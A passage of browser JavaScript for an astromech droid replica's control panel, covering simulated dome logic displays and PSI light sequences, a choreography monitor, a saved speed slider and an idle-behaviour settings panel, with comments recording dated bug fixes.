      if (_mode === 'short') {
        if (_tick - _lastShort >= 3) { _modes.short(_tick); _lastShort = _tick; }
      } else {
        (_modes[_mode] || _modes.random)(_tick);
      }
      _renderCustomPSI();
    }
    requestAnimationFrame(_loop);
  }

  function _updateBadge(key) {
    const badge = document.getElementById('mode-status-badge');
    if (!badge) return;
    const m = META[key] || { label: key.toUpperCase(), color: '#00aaff' };
    badge.textContent = m.label;
    badge.style.color = m.color;
    badge.style.borderColor = m.color + '55';
    badge.style.background = m.color + '10';
  }

  return {
    /** Call once when the lights tab first loads */
    init() {
      if (_running) {
        // Already initialised; just resume the rAF loop if paused.
        if (!_active) { _active = true; requestAnimationFrame(_loop); }
        return;
      }
      // Build dot grids
      Object.entries(CFG).forEach(([id, c]) => {
        const e = document.getElementById(id);
        if (!e || e.querySelector('.sim-dot')) return; // already built
        for (let r = 0; r < c.rows; r++) {
          const row = document.createElement('div');
          row.className = 'logic-row';
          for (let col = 0; col < c.cols; col++) {
            const d = document.createElement('div');
            d.className = `sim-dot ${c.cls}`;
            row.appendChild(d);
          }
          e.appendChild(row);
        }
      });
      _running = true;
      _active  = true;
      _loop();
    },
    /** B2/P1 fix 2026-05-16: stop the rAF loop. Called by switchTab
     *  when the operator leaves the Lights tab. */
    pause() { _active = false; },
    /** Resume the rAF loop. Called by switchTab when re-entering
     *  Lights. Safe to call if already active (no double-loop). */
    resume() {
      if (!_running || _active) return;
      _active = true;
      requestAnimationFrame(_loop);
    },

    /** Set animation mode from a mode number (from playAnimation) */
    setModeNum(num) {
      const key = MODE_MAP[num] || 'random';
      this.setMode(key);
    },

    /** Set animation mode from a string key ('random', 'leia', 'off') */
    setMode(key) {
      _mode = key;
      _tick = 0;
      if (key !== 'text') {
        Object.keys(_textState).forEach(k => { _textState[k].active = false; _textState[k].buf = null; });
        ['fld-top','fld-bot','rld'].forEach(id => {
          const e = document.getElementById(id);
          if (e) e.className = 'logic-display';
        });
      }
      // Update active chip
      document.querySelectorAll('.anim-chip').forEach(b => b.classList.remove('active'));
      _updateBadge(key);
    },

    /** Set text for a display target: fld_top | fld_bottom | fld_both | rld | all */
    setText(target, text) {
      if (!text) return;
      const t = (target || 'fld_top').toLowerCase();
      const fldTop = t === 'fld_top' || t === 'fld_both' || t === 'fld' || t === 'both' || t === 'all';
      const fldBot = t === 'fld_bottom' || t === 'fld_both' || t === 'fld' || t === 'both' || t === 'all';
      const rldOn  = t === 'rld' || t === 'both' || t === 'all';
      if (fldTop) {
        _textState['fld-top'].buf = _buildBuf(text, 5, FONT5);
        _textState['fld-top'].scroll = 0; _textState['fld-top'].active = true;
      }
      if (fldBot) {
        _textState['fld-bot'].buf = _buildBuf(text, 5, FONT5);
        _textState['fld-bot'].scroll = 0; _textState['fld-bot'].active = true;
      }
      if (rldOn) {
        _textState['rld'].buf = _buildBuf(text, 4, FONT4);
        _textState['rld'].scroll = 0; _textState['rld'].active = true;
      }
      _mode = 'text';
      _tick = 0;
      // Highlight active panels
      document.getElementById('fld-top')?.classList.toggle('active-top', _textState['fld-top'].active);
      document.getElementById('fld-bot')?.classList.toggle('active-bot', _textState['fld-bot'].active);
      document.getElementById('rld')?.classList.toggle('active-rld', _textState['rld'].active);
      document.querySelectorAll('.anim-chip').forEach(b => b.classList.remove('active'));
      _updateBadge('text');
    },

    /** Set PSI to a solid color (keeps active=true so T-codes can't override) */
    updatePSI(color) {
      _psiCustom.front.c1 = color; _psiCustom.front.c2 = color;
      _psiCustom.rear.c1  = color; _psiCustom.rear.c2  = color;
    },

    /** Set one PSI to a custom blink: c2='#000000' = pulse off→c1 */
    setPSICustom(side, c1, c2, speed) {
      _psiCustom[side].c1 = c1;
      _psiCustom[side].c2 = c2;
      _psiCustom[side].speed = speed;
      _psiCustom[side].active = true;
      const elemId = side === 'front' ? 'psi-front' : 'psi-rear';
      document.getElementById(elemId)?.classList.add('psi-custom');
    },

    /** Reset both PSIs to NORMAL (blue blink) — PSI stays independent of T-code animations */
    resetPSICustom() {
      for (const s of ['front', 'rear']) {
        _psiCustom[s].c1 = '#00aaff'; _psiCustom[s].c2 = '#0055aa'; _psiCustom[s].speed = 0.8;
      }
    },
  };
})();


// PSI sequence animation params {c1, c2, speed} — matches AstroPixels+ firmware behavior
// flash: strobe on/off 250ms | alarm: color↔red alt | failure: rapid dim/bright
// redalert: solid red | leia: solid green | march: fast yellow/orange beat
const _PSI_SEQ_ANIM = {
  normal:   { c1: '#00aaff', c2: '#00aaff', speed: 1.0  }, // steady blue
  flash:    { c1: '#00aaff', c2: '#000000', speed: 0.25 }, // fast strobe ON/OFF
  alarm:    { c1: '#00aaff', c2: '#ff2244', speed: 0.5  }, // blue ↔ red alternating
  failure:  { c1: '#ff8800', c2: '#220000', speed: 0.2  }, // rapid orange/dark cycle
  redalert: { c1: '#ff0000', c2: '#ff0000', speed: 1.0  }, // solid red
  leia:     { c1: '#44ff88', c2: '#44ff88', speed: 1.0  }, // solid pale green
  march:    { c1: '#ffee00', c2: '#ff4400', speed: 0.15 }, // fast yellow/orange beat
};
// Color used by choreo monitor (single representative color per sequence)
const _PSI_SEQ_COLORS = {
  normal:'#00aaff', flash:'#00aaff', alarm:'#ff2244',
  failure:'#ff8800', redalert:'#ff0000', leia:'#44ff88', march:'#ffee00',
};

function applyPSI() {
  const target   = el('psi-target')?.value   || 'both';
  const sequence = el('psi-sequence')?.value || 'normal';
  // E4 fix 2026-05-16: debounce — operator spam-clicking SET PSI
  // produced burst POSTs that interleaved badly on UART.
  if (_lightsThrottled('psi:' + target + ':' + sequence)) return;
  // B8 fix 2026-05-16: only mute the dome sim AFTER server accepts.
  // Was: setPSICustom ran synchronously regardless of HTTP result —
  // local sim showed RED ALERT even when server returned 403/500.
  const btn = el('psi-apply-btn');
  const run = () => api('/teeces/psi_seq', 'POST', { target, sequence }).then(d => {
    if (!d) {
      toast(`PSI ${sequence.toUpperCase()} failed — admin needed`, 'error');
      return null;
    }
    toast(`PSI ${target.toUpperCase()} — ${sequence.toUpperCase()}`, 'ok');
    const anim = _PSI_SEQ_ANIM[sequence] || _PSI_SEQ_ANIM.normal;
    if (target === 'both' || target === 'fpsi') _domeSim.setPSICustom('front', anim.c1, anim.c2, anim.speed);
    if (target === 'both' || target === 'rpsi') _domeSim.setPSICustom('rear',  anim.c1, anim.c2, anim.speed);
    return d;
  });
  if (btn && typeof withSaveFeedback === 'function') {
    withSaveFeedback(btn, run);
  } else {
    run();
  }
}

// W13 fix 2026-05-16: live preview of PSI sequence in dome sim BEFORE
// the operator clicks SET PSI. onchange handler reads current target +
// sequence, updates the visual sim only (no UART write). Operator
// auditions colors safely; clicking SET PSI commits to hardware.
function previewPSI() {
  const target   = el('psi-target')?.value   || 'both';
  const sequence = el('psi-sequence')?.value || 'normal';
  const anim = _PSI_SEQ_ANIM[sequence] || _PSI_SEQ_ANIM.normal;
  if (target === 'both' || target === 'fpsi') _domeSim.setPSICustom('front', anim.c1, anim.c2, anim.speed);
  if (target === 'both' || target === 'rpsi') _domeSim.setPSICustom('rear',  anim.c1, anim.c2, anim.speed);
}

function resetPSI() {
  teecesMode('random');
  _domeSim.resetPSICustom();
}

// ================================================================
// _chorMon — Independent photorealistic display engine for the
// Choreo left panel. Targets chor-prefixed element IDs so it
// never interferes with the Light tab's _domeSim instance.
// Driven by the lights track timeline, NOT by the Light tab controls.
// ================================================================
const _chorMon = (() => {
  const FONT5 = {
    'A':[2,5,7,5,5],'B':[6,5,6,5,6],'C':[3,4,4,4,3],'D':[6,5,5,5,6],'E':[7,4,6,4,7],
    'F':[7,4,6,4,4],'G':[3,4,5,5,3],'H':[5,5,7,5,5],'I':[7,2,2,2,7],'J':[1,1,1,5,2],
    'K':[5,5,6,5,5],'L':[4,4,4,4,7],'M':[5,7,7,5,5],'N':[5,7,5,5,5],'O':[2,5,5,5,2],
    'P':[6,5,6,4,4],'Q':[2,5,5,7,3],'R':[6,5,6,5,5],'S':[3,4,2,1,6],'T':[7,2,2,2,2],
    'U':[5,5,5,5,2],'V':[5,5,5,5,2],'W':[5,5,7,7,5],'X':[5,5,2,5,5],'Y':[5,5,2,2,2],
    'Z':[7,1,2,4,7],'0':[2,5,5,5,2],'1':[2,6,2,2,7],'2':[6,1,2,4,7],'3':[6,1,2,1,6],
    '4':[5,5,7,1,1],'5':[7,4,6,1,6],'6':[3,4,6,5,2],'7':[7,1,2,2,2],'8':[2,5,2,5,2],
    '9':[2,5,3,1,6],' ':[0,0,0,0,0],'!':[2,2,2,0,2],'?':[6,1,2,0,2],'.':[0,0,0,0,2],
    '-':[0,0,7,0,0],':':[0,2,0,2,0],'+':[0,2,7,2,0],'♥':[0,5,7,2,0],'#':[5,7,5,7,5],
  };
  const FONT4 = {
    'A':[2,5,7,5],'B':[6,6,5,6],'C':[3,4,4,3],'D':[6,5,5,6],'E':[7,6,4,7],
    'F':[7,6,4,4],'G':[3,4,5,3],'H':[5,7,5,5],'I':[7,2,2,7],'J':[1,1,5,2],
    'K':[5,6,6,5],'L':[4,4,4,7],'M':[5,7,5,5],'N':[5,7,5,5],'O':[2,5,5,2],
    'P':[6,5,6,4],'Q':[2,5,7,3],'R':[6,5,6,5],'S':[3,2,1,6],'T':[7,2,2,2],
    'U':[5,5,5,2],'V':[5,5,5,2],'W':[5,5,7,5],'X':[5,2,2,5],'Y':[5,5,2,2],
    'Z':[7,2,4,7],'0':[2,5,5,2],'1':[2,6,2,7],'2':[6,2,4,7],'3':[6,2,1,6],
    '4':[5,7,1,1],'5':[7,6,1,6],'6':[3,6,5,2],'7':[7,1,2,2],'8':[2,2,5,2],
    '9':[2,5,3,1],' ':[0,0,0,0],'!':[2,2,0,2],'?':[6,2,0,2],'.':[0,0,0,2],
    '-':[0,7,0,0],':':[2,0,2,0],'+':[0,7,2,0],'♥':[5,7,2,0],
  };
  const CFG = {
    'chor-fld-top': { rows:5, cols:9, cls:'dot-fld' },
    'chor-fld-bot': { rows:5, cols:9, cls:'dot-fld' },
    'chor-rld':     { rows:4, cols:27, cls:'dot-rld' },
  };
  const MODE_MAP = {
    1:'random',2:'flash',3:'alarm',4:'short',5:'scream',
    6:'leia',7:'love',8:'sweep',9:'pulse',10:'starwars',
    11:'imperial',12:'disco',13:'disco',14:'alarm',15:'sweep',
    16:'white',17:'redon',18:'greenon',19:'saber',20:'off',
    21:'pulse',92:'pulse',
  };
  let _tick=0, _mode='off', _lastShort=0, _running=false;
  let _psiColor='#00ffea', _psiColor2='#00ffea', _psiBlinkSpeed=0;
  const _textState = {
    'chor-fld-top': { buf:null, scroll:0, color:'#00ffea', active:false },
    'chor-fld-bot': { buf:null, scroll:0, color:'#00aaff', active:false },
    'chor-rld':     { buf:null, scroll:0, color:'#ff8800', active:false },
  };

  function _buildBuf(text, rows, font) {
    const buf = Array.from({ length: rows }, () => []);
    (text.toUpperCase() + '   ').split('').forEach(ch => {
      const g = font[ch] || font[' '];
      for (let c=0;c<3;c++) for (let r=0;r<rows;r++) buf[r].push((g[r]>>(2-c))&1);
      for (let r=0;r<rows;r++) buf[r].push(0);
    });
    return buf;
  }
  function _getDots(id) { const e=document.getElementById(id); return e?Array.from(e.querySelectorAll('.sim-dot')):[]; }
  function _lit(d,c)  { if(!d)return; d.style.background=c; d.style.boxShadow=`0 0 4px ${c}`; }
  function _dim(d)    { if(!d)return; d.style.background='rgba(0,170,255,0.07)'; d.style.boxShadow='none'; }
  function _setPSI(front, rear) {
    const pf=document.getElementById('chor-psi-front'), pr=document.getElementById('chor-psi-rear');
    if(pf){pf.style.background=front; pf.style.boxShadow=`0 0 14px ${front}`;}
    if(pr){pr.style.background=rear;  pr.style.boxShadow=`0 0 14px ${rear}`;}
  }
  function _renderText(id) {
    const st=_textState[id]; if(!st.buf)return;
    const{rows,cols}=CFG[id]; const dots=_getDots(id); const bufLen=st.buf[0]?.length||1;
    st.scroll=(st.scroll+1)%(bufLen+cols);
    for(let r=0;r<rows;r++) for(let c=0;c<cols;c++){
      const bIdx=c+st.scroll-cols; const on=bIdx>=0&&bIdx<bufLen&&st.buf[r]&&st.buf[r][bIdx];
      on?_lit(dots[r*cols+c],st.color):_dim(dots[r*cols+c]);
    }
  }
  const IDS = ['chor-fld-top','chor-fld-bot','chor-rld'];
  const _modes = {
    random(t) {
      IDS.forEach((id,si)=>{const{rows,cols}=CFG[id];const dots=_getDots(id);for(let r=0;r<rows;r++)for(let c=0;c<cols;c++)Math.sin(t*0.07+(r*cols+c+si*23)*0.73)>0.1?_lit(dots[r*cols+c],'#00aaff'):_dim(dots[r*cols+c]);});_setPSI('#00aaff','#0077cc');
    },
    flash(t){const on=Math.floor(t/5)%2===0;IDS.forEach(id=>_getDots(id).forEach(d=>on?_lit(d,'#ffcc00'):_dim(d)));_setPSI(on?'#ffcc00':'#221100',on?'#ffaa00':'#110800');},
    alarm(t){
      const sw=Math.floor(t*0.1)%9;
      ['chor-fld-top','chor-fld-bot'].forEach(id=>{const{rows,cols}=CFG[id];const dots=_getDots(id);for(let r=0;r<rows;r++)for(let c=0;c<cols;c++)Math.abs(c-sw)<2?_lit(dots[r*cols+c],'#ff2244'):_dim(dots[r*cols+c]);});
      const sw2=Math.floor(t*0.1)%27;const{rows:rr,cols:rc}=CFG['chor-rld'];const rd=_getDots('chor-rld');for(let r=0;r<rr;r++)for(let c=0;c<rc;c++)Math.abs(c-sw2)<3?_lit(rd[r*rc+c],'#ff2244'):_dim(rd[r*rc+c]);_setPSI('#ff2244','#ff0022');
    },
    short(t){const cs=['#ff2244','#ffcc00','#00ffea','#ff8800','#aa66ff','#00cc66','#fff'];IDS.forEach(id=>_getDots(id).forEach(d=>Math.random()>0.65?_lit(d,cs[Math.floor(Math.random()*cs.length)]):_dim(d)));_setPSI(cs[Math.floor(t*0.18)%cs.length],cs[(Math.floor(t*0.18)+3)%cs.length]);},
    scream(t){IDS.forEach((id,si)=>{const{rows,cols}=CFG[id];const dots=_getDots(id);for(let r=0;r<rows;r++)for(let c=0;c<cols;c++)Math.sin(t*0.14+(r*cols+c+si*11)*0.4)*0.5+0.5>0.35?_lit(dots[r*cols+c],'#00ffea'):_dim(dots[r*cols+c]);});_setPSI('#00ffea','#009988');},
    leia(t){const wave=(t*0.03)%1;IDS.forEach(id=>{const{rows,cols}=CFG[id];const dots=_getDots(id);for(let r=0;r<rows;r++)for(let c=0;c<cols;c++){const frac=c/cols,dist=Math.min(Math.abs(frac-wave),1-Math.abs(frac-wave));dist<0.22?_lit(dots[r*cols+c],'#9955ff'):_dim(dots[r*cols+c]);}});_setPSI('#9955ff','#7733bb');},
    love(t){const beat=Math.sin(t*0.14)*0.5+0.5>0.35;IDS.forEach(id=>_getDots(id).forEach(d=>beat?_lit(d,'#ff66cc'):_dim(d)));_setPSI(beat?'#ff66cc':'#330011',beat?'#ff44aa':'#220011');},
    sweep(t){const pos=Math.sin(t*0.04)*0.5+0.5;IDS.forEach(id=>{const{rows,cols}=CFG[id];const dots=_getDots(id);for(let r=0;r<rows;r++)for(let c=0;c<cols;c++)Math.abs(c/cols-pos)<0.12?_lit(dots[r*cols+c],'#00aaff'):_dim(dots[r*cols+c]);});_setPSI('#00aaff','#0066aa');},
    pulse(t){const v=Math.sin(t*0.09)*0.5+0.5;IDS.forEach(id=>{const{rows,cols}=CFG[id];const dots=_getDots(id);for(let r=0;r<rows;r++)for(let c=0;c<cols;c++)c/cols<v?_lit(dots[r*cols+c],'#00cc66'):_dim(dots[r*cols+c]);});_setPSI('#00cc66','#009944');},
    starwars(t){IDS.forEach(id=>{const{rows,cols}=CFG[id];const dots=_getDots(id);const sp=Math.floor(t*0.07);for(let r=0;r<rows;r++)for(let c=0;c<cols;c++)(c+sp)%cols<3?_lit(dots[r*cols+c],'#ffdd00'):_dim(dots[r*cols+c]);});_setPSI('#ffdd00','#bb9900');},
    imperial(t){const beat=Math.sin(t*0.22)*0.5+0.5>0.55;IDS.forEach((id,si)=>{const{rows,cols}=CFG[id];const dots=_getDots(id);for(let r=0;r<rows;r++)for(let c=0;c<cols;c++)Math.sin(t*0.18+(r*cols+c+si*7)*0.45)*0.5+0.5*(beat?1:0.3)>0.4?_lit(dots[r*cols+c],'#ff8800'):_dim(dots[r*cols+c]);});_setPSI(beat?'#ff8800':'#331100',beat?'#ff6600':'#221100');},
    disco(t){const cs=['#ff2244','#ffcc00','#00ffea','#ff66cc','#8844ff','#00cc66','#ff8800'];IDS.forEach((id,si)=>{const{rows,cols}=CFG[id];const dots=_getDots(id);for(let r=0;r<rows;r++)for(let c=0;c<cols;c++)_lit(dots[r*cols+c],cs[(Math.floor(t*0.09)+(r*cols+c+si*5))%cs.length]);});_setPSI(cs[Math.floor(t*0.12)%cs.length],cs[(Math.floor(t*0.12)+3)%cs.length]);},
    saber(t){const pos=Math.sin(t*0.05)*0.5+0.5;IDS.forEach(id=>{const{rows,cols}=CFG[id];const dots=_getDots(id);for(let r=0;r<rows;r++)for(let c=0;c<cols;c++)c/cols<pos?_lit(dots[r*cols+c],'#44ff88'):_dim(dots[r*cols+c]);});_setPSI('#44ff88','#22cc55');},
    redon()  {IDS.forEach(id=>_getDots(id).forEach(d=>_lit(d,'#ff2244')));_setPSI('#ff2244','#cc0022');},
    greenon(){IDS.forEach(id=>_getDots(id).forEach(d=>_lit(d,'#00cc66')));_setPSI('#00cc66','#009944');},
    white()  {IDS.forEach(id=>_getDots(id).forEach(d=>_lit(d,'#eef2ff')));_setPSI('#ffffff','#ccddff');},
    off()    {IDS.forEach(id=>_getDots(id).forEach(d=>_dim(d)));_setPSI('#0a0e14','#0a0e14');},
    psi(t)   {
      if(_psiBlinkSpeed>0){const on=Math.floor(t*_psiBlinkSpeed)%2===0;_setPSI(on?_psiColor:_psiColor2,on?_psiColor:_psiColor2);}
      else{_setPSI(_psiColor,_psiColor);}
    },
    text(t) {
      if(t%8===0) IDS.forEach(id=>{
        if(_textState[id].active){_renderText(id);}
        else{const{rows,cols}=CFG[id];const dots=_getDots(id);for(let r=0;r<rows;r++)for(let c=0;c<cols;c++)Math.sin(t*0.07+(r*cols+c)*0.5)>0.1?_lit(dots[r*cols+c],'rgba(0,170,255,0.3)'):_dim(dots[r*cols+c]);}
      });
      _setPSI('#00ffea','#ff8800');
    },
  };

  // _active gates the rAF loop. rAF is auto-paused by browsers when the
  // *browser* tab is hidden, but not when this SPA's #tab-choreo container
  // simply has display:none — so before this gate the dot animations kept
  // burning CPU on the Pi 4B even when the user was on Drive/Audio/etc.
  // pause() flips _active=false; the next _loop call sees it and skips
  // scheduling the next frame. resume() flips it back and re-arms _loop.
  let _active = false;
  function _loop() {
    if (!_active) return;
    _tick++;
    if(_mode==='short'){if(_tick-_lastShort>=3){_modes.short(_tick);_lastShort=_tick;}}
    else{(_modes[_mode]||_modes.off)(_tick);}
    requestAnimationFrame(_loop);
  }

  return {
    init() {
      if(_running) {
        // Already initialised; just resume the rAF loop if it had been paused.
        if (!_active) { _active = true; requestAnimationFrame(_loop); }
        return;
      }
      Object.entries(CFG).forEach(([id,c])=>{
        const e=document.getElementById(id); if(!e||e.querySelector('.sim-dot'))return;
        for(let r=0;r<c.rows;r++){
          const row=document.createElement('div'); row.className='logic-row';
          for(let col=0;col<c.cols;col++){const d=document.createElement('div');d.className=`sim-dot ${c.cls}`;row.appendChild(d);}
          e.appendChild(row);
        }
      });
      _running=true; _active=true; _loop();
    },
    pause() {
      _active = false;
    },
    resume() {
      if (!_running || _active) return;
      _active = true;
      requestAnimationFrame(_loop);
    },
    setModeNum(num){ this.setMode(MODE_MAP[num]||'random'); },
    setMode(key) {
      if(_mode===key) return;
      _mode=key; _tick=0;
      if(key!=='text') Object.keys(_textState).forEach(k=>{_textState[k].active=false;_textState[k].buf=null;});
    },
    setText(target, text, color) {
      if(!text) return;
      const t = (target||'fld_top').toLowerCase();
      // FLD top row
      if(t==='fld_top'||t==='fld_both'||t==='fld'||t==='both'||t==='all'){
        const id='chor-fld-top';
        _textState[id].buf=_buildBuf(text,5,FONT5);_textState[id].scroll=0;_textState[id].active=true;
        if(color)_textState[id].color=color;
      }
      // FLD bottom row
      if(t==='fld_bottom'||t==='fld_both'||t==='fld'||t==='both'||t==='all'){
        const id='chor-fld-bot';
        _textState[id].buf=_buildBuf(text,5,FONT5);_textState[id].scroll=0;_textState[id].active=true;
        if(color)_textState[id].color=color;
      }
      // RLD
      if(t==='rld'||t==='both'||t==='all'){
        const id='chor-rld';
        _textState[id].buf=_buildBuf(text,4,FONT4);_textState[id].scroll=0;_textState[id].active=true;
        if(color)_textState[id].color=color;
      }
      _mode='text'; _tick=0;
    },
    updatePSI(color, seq) {
      const a = _PSI_SEQ_ANIM[seq];
      if (a) { _psiColor=a.c1; _psiColor2=a.c2; _psiBlinkSpeed=(a.c1===a.c2)?0:(1/a.speed); }
      else    { _psiColor=color; _psiColor2=color; _psiBlinkSpeed=0; }
    },
  };
})();

// F-14: persist the speed slider in localStorage so page reload doesn't
// reset to 60% mid-session. The slider is intentionally per-client
// (different clients can drive at different scales — useful when a
// parent + child are each on their own tablet). Server-side persistence
// would force a single global value and break that use case.
const _SPEED_LS_KEY = 'astromech-speed-limit';

// WOW HW1 2026-05-15: cache last-known power_scale so setSpeed can
// update the "effective" hint live (e.g. operator drags slider while
// power_scale=0.5, sees the multiplied result update in real-time).
let _powerScaleCached = 1.0;

function _updateSpeedEffective() {
  const v = Math.round((_speedLimit || 0) * 100);
  const eff = el('speed-effective');
  if (!eff) return;
  if (_powerScaleCached >= 0.99) {
    eff.style.display = 'none';
  } else {
    const realPct = Math.round(v * _powerScaleCached);
    eff.style.display = 'inline';
    eff.textContent = ` × ${Math.round(_powerScaleCached * 100)}% = ${realPct}%`;
  }
}

// Perf 2026-05-15: localStorage write debounced — dragging the
// slider fires onInput per pixel (~55 writes/drag on tablet,
// each a sync IPC on Android WebView). 250ms debounce = single
// write at the end of the drag.
let _setSpeedLsTimer = null;

function setSpeed(val) {
  let v = Math.max(10, Math.min(100, parseInt(val, 10) || 60));
  // WOW M3-W 2026-05-15: snap to common values (25/50/75/100) within
  // ±2% — saves operator fine-tuning to land on 50% on tablet.
  const snaps = [25, 50, 75, 100];
  for (const s of snaps) { if (Math.abs(v - s) <= 2) { v = s; break; } }
  _speedLimit = v / 100;
  const valEl = el('speed-val');
  if (valEl) valEl.textContent = v + '%';
  const slider = el('speed-slider');
  if (slider) {
    slider.style.setProperty('--val', v + '%');
    if (slider.value !== String(v)) slider.value = v;
  }
  _updateSpeedEffective();
  clearTimeout(_setSpeedLsTimer);
  _setSpeedLsTimer = setTimeout(() => {
    try { localStorage.setItem(_SPEED_LS_KEY, String(v)); } catch {}
  }, 250);
}

// Restore the saved slider value on page load — runs after #speed-slider
// exists in the DOM so we can update the visual too.
(function _restoreSpeedSlider() {
  try {
    const saved = parseInt(localStorage.getItem(_SPEED_LS_KEY), 10);
    if (Number.isFinite(saved) && saved >= 10 && saved <= 100) {
      // Defer to next tick so #speed-slider has been parsed.
      setTimeout(() => setSpeed(saved), 0);
    }
  } catch {}
})();

function driveStop()       { api('/motion/stop',      'POST'); }
function domeStop()        { api('/motion/dome/stop', 'POST'); }
function domeRandom(on)    { api('/motion/dome/random', 'POST', { enabled: on }); }

// ================================================================
// Behavior Engine — ALIVE toggle + Settings panel
// ================================================================

const behaviorPanel = (() => {
  let _aliveOn    = false;
  let _choreoList = [];
  let _countdownTimer = null;
  let _countdownTargetMs = 0;   // performance.now() ms at trigger fire

  // WOW polish H4 2026-05-15: live countdown to next idle reaction.
  // Operator sees 'Next idle reaction in 9:58' ticking down so the
  // system feels armed. Stops when alive is off or panel hidden.
  function _formatCountdown(s) {
    if (s <= 0) return 'imminent…';
    const m = Math.floor(s / 60);
    const sec = Math.floor(s % 60);
    return `${m}:${String(sec).padStart(2, '0')}`;
  }
  function _countdownTick() {
    const wrap = el('beh-next-trigger');
    const txt  = el('beh-next-trigger-time');
    if (!wrap || !txt) return;
    const panel = el('spanel-behavior');
    if (!panel || !panel.classList.contains('active')) {
      if (_countdownTimer) { clearInterval(_countdownTimer); _countdownTimer = null; }
      return;
    }
    if (!_aliveOn || _countdownTargetMs === 0) {
      wrap.style.display = 'none';
      // B11 fix 2026-05-16: also clear the interval, not just hide.
      // Was: timer kept ticking every 1s forever when ALIVE got toggled
      // off via Drive button while Settings panel was still active.
      if (_countdownTimer) { clearInterval(_countdownTimer); _countdownTimer = null; }
      return;
    }
    const remaining = (_countdownTargetMs - performance.now()) / 1000;
    wrap.style.display = 'flex';
    txt.textContent = _formatCountdown(remaining);
  }
  function _startCountdown(nextIdleS) {
    if (nextIdleS == null) { _countdownTargetMs = 0; return; }
    _countdownTargetMs = performance.now() + nextIdleS * 1000;
    if (_countdownTimer) clearInterval(_countdownTimer);
    _countdownTimer = setInterval(_countdownTick, 1000);
    _countdownTick();
  }

  // ------------------------------------------------------------------
  // ALIVE button (Drive tab)
  // ------------------------------------------------------------------
  function toggleAlive() {
    _aliveOn = !_aliveOn;
    _applyAliveBtn();
    api('/behavior/alive', 'POST', { enabled: _aliveOn }).catch(() => {
      _aliveOn = !_aliveOn;
      _applyAliveBtn();
    });
  }

  function _applyAliveBtn() {
    const btn = el('alive-toggle-btn');
    if (!btn) return;
    btn.classList.toggle('alive-btn-on', _aliveOn);
  }

  // ------------------------------------------------------------------
  // Settings panel
  // ------------------------------------------------------------------
  // Cache choreo list (with uses_propulsion/uses_dome flags) for W3 lock icons
  let _choreoMeta = [];

  function load() {
    api('/behavior/status').then(d => {
      _aliveOn = d.alive_enabled;
      _applyAliveBtn();

      _setChk('beh-startup-enabled', d.startup_enabled);
      _setVal('beh-startup-delay',   d.startup_delay);
      _setChk('beh-alive-enabled',   d.alive_enabled);
      _setVal('beh-idle-timeout',    d.idle_timeout_min);
      _setChk('beh-dome-auto',       d.dome_auto_on_alive);

      // WOW polish H4: start the live countdown from server-reported
      // next_idle_in_s. Re-syncs every panel load.
      _startCountdown(d.next_idle_in_s);

      // B16 fix 2026-05-16: surface idle_mode dependency warnings
      const warn = el('beh-mode-not-ready');
      const warnTxt = el('beh-mode-not-ready-text');
      if (warn && warnTxt) {
        if (d.idle_mode_ready === false && d.alive_enabled) {
          warn.style.display = '';
          warnTxt.textContent = d.idle_mode_reason || 'driver unavailable';
        } else {
          warn.style.display = 'none';
        }
      }

      // B12 fix 2026-05-16: dedup the idle_choreo_list in case hand-edit or
      // pre-cascade leaked duplicates
      _choreoList = Array.from(new Set(d.idle_choreo_list || []));
      // W7 fix 2026-05-16: capture last-fired idle choreo for pill marker
      behaviorPanel._lastIdleChoreo = d.last_idle_choreo || '';

      Promise.all([
        api('/choreo/list'),
        api('/audio/index')   // P2: was /audio/categories — same data, drop dupe endpoint
      ]).then(([choreoData, audioData]) => {
        // W3 fix 2026-05-16: cache choreo metadata (uses_propulsion/uses_dome)
        // so we can decorate selected names with lock icons
        _choreoMeta = Array.isArray(choreoData) ? choreoData : [];
        const chorFiles = _choreoMeta.map(f => f.name || f);
        _populateSel('beh-startup-choreo', chorFiles, d.startup_choreo);
        _populateSel('beh-choreo-add-sel', chorFiles, null);

        // W5 fix 2026-05-16: append sound count to category dropdown so
        // operator knows "happy (3)" vs "happy (47)" before saving
        const catCounts = audioData?.categories || {};
        const catEntries = Object.entries(catCounts).map(([k, v]) => ({
          name: k,
          count: Array.isArray(v) ? v.length : 0,
        }));
        _populateSelWithCounts('beh-audio-category', catEntries, d.idle_audio_category);

        _setSelVal('beh-idle-mode', d.idle_mode);
        onModeChange();
        _renderChoreoPills();
        // Lock icon next to startup select after populate
        _renderStartupLocks();
        el('beh-startup-choreo')?.addEventListener('change', _renderStartupLocks);
      });
    }).catch(() => {});
  }

  // W3 helpers — render 🚗/↻ icons for choreos that use propulsion/dome
  function _locksFor(name) {
    const meta = _choreoMeta.find(c => c.name === name);
    if (!meta) return '';
    const icons = [];
    if (meta.uses_propulsion) icons.push('🚗');
    if (meta.uses_dome)       icons.push('↻');
    return icons.join('');
  }
  function _renderStartupLocks() {
    const wrap = el('beh-startup-locks');
    if (!wrap) return;
    const name = _getSelVal('beh-startup-choreo');
    const ic = _locksFor(name);
    wrap.textContent = ic;
    wrap.title = ic ? 'This choreo moves: ' + (ic.includes('🚗') ? 'propulsion ' : '') + (ic.includes('↻') ? 'dome ' : '') : '';
  }

  function onModeChange() {
    const mode = _getSelVal('beh-idle-mode');
    const showAudio  = mode === 'sounds' || mode === 'sounds_lights';
    const showChoreo = mode === 'choreo';
    _show('beh-audio-cat-row', showAudio);
    _show('beh-choreo-row',    showChoreo);
    // Dome auto-rotation is handled by choreos — disable when mode is choreo
    const domeChk = el('beh-dome-auto');
    if (domeChk) {
      domeChk.disabled = showChoreo;
      if (domeChk.parentElement) domeChk.parentElement.style.opacity = showChoreo ? '0.4' : '';
    }
    // W9 fix 2026-05-16: contextual mode note so operator knows what
    // will move (or not). Inline below the mode select.
    const note = el('beh-mode-note');
    if (note) {
      const NOTES = {
        sounds:        '🔊 Audio only — no movement.',
        sounds_lights: '🔊💡 Audio + lights — no movement.',
        lights:        '💡 Lights only — random animation per cycle.',
        choreo:        '⚠ Selected choreos may move dome, panels, arms, or propulsion. Check the 🚗 / ↻ icons next to choreo names.',
      };
      note.textContent = NOTES[mode] || '';
      note.classList.toggle('settings-card-warn', mode === 'choreo');
    }
  }

  function addChoreo() {
    const sel = el('beh-choreo-add-sel');
    if (!sel || !sel.value) return;
    const name = sel.value;
    if (!_choreoList.includes(name)) {
      _choreoList.push(name);
      _renderChoreoPills();
    }
  }

  function _renderChoreoPills() {
    const container = el('beh-choreo-pills');
    if (!container) return;
    // B-200 (remaining tabs audit 2026-05-15): build pills with DOM
    // primitives instead of innerHTML interpolation (XSS via filename).
    container.replaceChildren();
